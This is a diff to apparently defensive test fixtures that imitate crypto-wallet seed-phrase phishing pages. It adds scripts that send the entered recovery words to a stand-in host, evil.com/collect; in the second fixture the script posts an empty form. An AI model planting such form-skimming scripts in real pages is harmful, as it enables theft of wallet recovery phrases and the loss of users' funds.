@@ -85,6 +85,9 @@ SEED_PHRASE_TEXTAREA_EVASION = """<!DOCTYPE html>
   <textarea name="word6" placeholder="Word 6"></textarea>
   <textarea name="word7" placeholder="Word 7"></textarea>
   <button type="submit">Restore</button>
+  <script>
+  $.post("https://evil.com/collect", {words: $("textarea").map(function(){return $(this).val()}).get()});
+  </script>
 </body>
 </html>"""
 
@@ -102,6 +105,10 @@ SEED_PHRASE_CONTENTEDITABLE_EVASION = """<!DOCTYPE html>
   <div contenteditable="true" class="word-input" data-index="7"></div>
   <div contenteditable="true" class="word-input" data-index="8"></div>
   <button>Import</button>
+  <script>
+  var words = document.querySelectorAll("[contenteditable]");
+  fetch("https://evil.com/collect", {method: "POST", body: new FormData()});
+  </script>
 </body>
 </html>"""
 
